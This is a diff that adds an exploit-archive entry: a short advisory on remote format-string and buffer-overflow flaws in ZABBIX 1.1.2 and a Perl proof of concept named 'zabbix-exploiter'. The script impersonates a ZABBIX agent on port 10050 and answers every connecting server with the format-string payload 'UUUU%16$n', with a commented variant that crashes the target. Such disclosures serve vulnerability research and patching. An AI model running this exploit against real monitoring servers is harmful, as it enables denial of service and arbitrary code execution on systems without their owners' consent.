@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/20416/info
+
+ZABBIX is prone to multiple unspecified remote code-execution vulnerabilities. 
+
+Reports indicate that these issues facilitate format-string and buffer-overflow attacks. A remote attacker may leverage these vulnerabilities to trigger denial-of-service conditions or to execute arbitrary code to gain unauthorized access to a vulnerable computer. This would occur in the context of the application.
+
+ZABBIX version 1.1.2 is reported vulnerable; other versions may be affected as well.
+
+#!/usr/bin/perl --
+
+# zabbix-exploiter
+# by Ulf Harnhammar in 2006
+# I hereby place this program in the public domain.
+
+use IO::Socket;
+$server = IO::Socket::INET->new( Proto     => 'tcp',
+                                 LocalPort => 10050,
+                                 Listen    => SOMAXCONN,
+                                 Reuse     => 1);
+die "can't create server\n" if !$server;
+
+while ($client = $server->accept())
+{
+  $client->autoflush(1);
+  $key = <$client>; print $key;
+  print $client 'UUUU%16$n'; # writes data to 0x55555555, at least on Debian testing
+  # print $client '%n%n%n%n'; # crashes
+  close $client;
+}
